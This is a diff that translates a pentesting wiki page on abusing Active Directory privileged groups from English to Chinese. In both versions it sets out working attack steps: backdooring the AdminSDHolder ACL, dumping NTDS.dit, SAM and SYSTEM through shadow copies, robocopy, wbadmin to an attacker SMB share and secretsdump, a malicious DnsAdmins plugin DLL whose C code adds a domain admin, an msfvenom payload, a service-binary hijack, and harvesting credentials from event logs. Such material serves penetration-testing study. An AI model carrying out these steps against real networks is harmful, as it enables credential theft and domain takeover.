@@ -1,115 +1,98 @@
-# Privileged Groups
+# 特权组
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-## Well Known groups with administration privileges
+## 具有管理权限的知名组
 
 - **Administrators**
 - **Domain Admins**
 - **Enterprise Admins**
 
-## Account Operators
+## 账户操作员
 
-This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
+该组有权创建不是域管理员的账户和组。此外，它还允许本地登录到域控制器 (DC)。
 
-To identify the members of this group, the following command is executed:
-
+要识别该组的成员，执行以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
+添加新用户是被允许的，同时也可以在 DC01 上进行本地登录。
 
-Adding new users is permitted, as well as local login to DC01.
+## AdminSDHolder 组
 
-## AdminSDHolder group
+**AdminSDHolder** 组的访问控制列表 (ACL) 至关重要，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全。
 
-The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
+攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，向标准用户授予完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们将在一小时内自动恢复。
 
-An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
-
-Commands to review the members and modify permissions include:
-
+查看成员和修改权限的命令包括：
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+一个脚本可用于加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
 
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+有关更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。
 
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+## AD 回收站
 
-## AD Recycle Bin
-
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
-
+加入此组允许读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### 域控制器访问
 
-### Domain Controller Access
+对 DC 上文件的访问受到限制，除非用户是 `Server Operators` 组的一部分，这会改变访问级别。
 
-Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
+### 权限提升
 
-### Privilege Escalation
-
-Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
-
+使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
+此命令显示 `Server Operators` 拥有完全访问权限，允许操纵服务以获取提升的权限。
 
-This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
+## 备份操作员
 
-## Backup Operators
+加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得即使没有明确的权限，也能进行文件夹遍历、列出和复制文件的操作，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.
-
-To list group members, execute:
-
+要列出组成员，请执行：
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
+### 本地攻击
 
-### Local Attack
+要在本地利用这些权限，采用以下步骤：
 
-To leverage these privileges locally, the following steps are employed:
-
-1. Import necessary libraries:
-
+1. 导入必要的库：
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-
-2. Enable and verify `SeBackupPrivilege`:
-
+2. 启用并验证 `SeBackupPrivilege`：
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
-3. Access and copy files from restricted directories, for instance:
-
+3. 访问并复制受限目录中的文件，例如：
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
+### AD 攻击
 
-### AD Attack
+直接访问域控制器的文件系统允许窃取 `NTDS.dit` 数据库，该数据库包含所有域用户和计算机的 NTLM 哈希。
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+#### 使用 diskshadow.exe
 
-#### Using diskshadow.exe
-
-1. Create a shadow copy of the `C` drive:
-
+1. 创建 `C` 盘的影子副本：
 ```cmd
 diskshadow.exe
 set verbose on
@@ -122,59 +105,47 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. 从影子副本中复制 `NTDS.dit`：
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Alternatively, use `robocopy` for file copying:
-
+或者，使用 `robocopy` 进行文件复制：
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. 提取 `SYSTEM` 和 `SAM` 以获取哈希：
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. 从 `NTDS.dit` 中检索所有哈希：
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### 使用 wbadmin.exe
 
-#### Using wbadmin.exe
+1. 在攻击者机器上设置 SMB 服务器的 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
+2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
+```cmd
+net use X: \\<AttackIP>\sharename /user:smbuser password
+echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
-1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
-2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-   ```cmd
-   net use X: \\<AttackIP>\sharename /user:smbuser password
-   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-   wbadmin get versions
-   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-   ```
-
-For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+有关实际演示，请参见 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。
 
 ## DnsAdmins
 
-Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
+**DnsAdmins** 组的成员可以利用他们的权限在 DNS 服务器上加载具有 SYSTEM 权限的任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。
 
-To list members of the DnsAdmins group, use:
-
+要列出 DnsAdmins 组的成员，请使用：
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### 执行任意 DLL
 
-### Execute arbitrary DLL
-
-Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
-
+成员可以使用以下命令使 DNS 服务器加载任意 DLL（无论是本地的还是来自远程共享的）：
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -185,8 +156,8 @@ An attacker could modify the DLL to add a user to the Domain Admins group or exe
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -194,107 +165,90 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+重新启动 DNS 服务（这可能需要额外的权限）是加载 DLL 所必需的：
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
+有关此攻击向量的更多详细信息，请参阅 ired.team。
 
 #### Mimilib.dll
 
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+使用 mimilib.dll 进行命令执行也是可行的，可以修改它以执行特定命令或反向 shell。 [查看此帖子](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 获取更多信息。
 
-### WPAD Record for MitM
+### WPAD 记录用于 MitM
 
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
+DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行中间人 (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗和捕获网络流量。
 
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+### 事件日志读取器
+成员可以访问事件日志，可能会找到敏感信息，例如明文密码或命令执行详细信息：
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
+## Exchange Windows 权限
 
-## Exchange Windows Permissions
-
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+该组可以修改域对象上的 DACL，可能授予 DCSync 权限。利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub 仓库。
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Hyper-V 管理员
 
-## Hyper-V Administrators
+Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控制虚拟化的域控制器。这包括克隆实时域控制器和从 NTDS.dit 文件中提取 NTLM 哈希。
 
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
+### 利用示例
 
-### Exploitation Example
-
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
+注意：硬链接利用在最近的Windows更新中已被缓解。
 
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+## 组织管理
 
-## Organization Management
+在部署了**Microsoft Exchange**的环境中，一个特殊的组称为**组织管理**，拥有重要的能力。该组有权**访问所有域用户的邮箱**，并对“Microsoft Exchange安全组”组织单位（OU）拥有**完全控制权**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行权限提升。
 
-In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.
+### 权限利用和命令
 
-### Privilege Exploitation and Commands
+#### 打印操作员
 
-#### Print Operators
+**打印操作员**组的成员被赋予多个权限，包括**`SeLoadDriverPrivilege`**，允许他们**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些权限，特别是当**`SeLoadDriverPrivilege`**在未提升的上下文中不可见时，必须绕过用户帐户控制（UAC）。
 
-Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
-
-To list the members of this group, the following PowerShell command is used:
-
+要列出该组的成员，可以使用以下PowerShell命令：
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+有关 **`SeLoadDriverPrivilege`** 的更详细利用技术，应咨询特定的安全资源。
 
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
+#### 远程桌面用户
 
-#### Remote Desktop Users
-
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+该组的成员通过远程桌面协议 (RDP) 获得对 PC 的访问权限。要列举这些成员，可以使用 PowerShell 命令：
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
+进一步了解利用 RDP 的信息可以在专门的渗透测试资源中找到。
 
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
+#### 远程管理用户
 
-#### Remote Management Users
-
-Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
-
+成员可以通过 **Windows 远程管理 (WinRM)** 访问 PC。通过以下方式枚举这些成员：
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
+对于与 **WinRM** 相关的利用技术，应咨询特定文档。
 
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
+#### 服务器操作员
 
-#### Server Operators
-
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要枚举成员，可以使用以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-## References <a href="#references" id="references"></a>
+## 参考文献 <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -313,10 +267,9 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
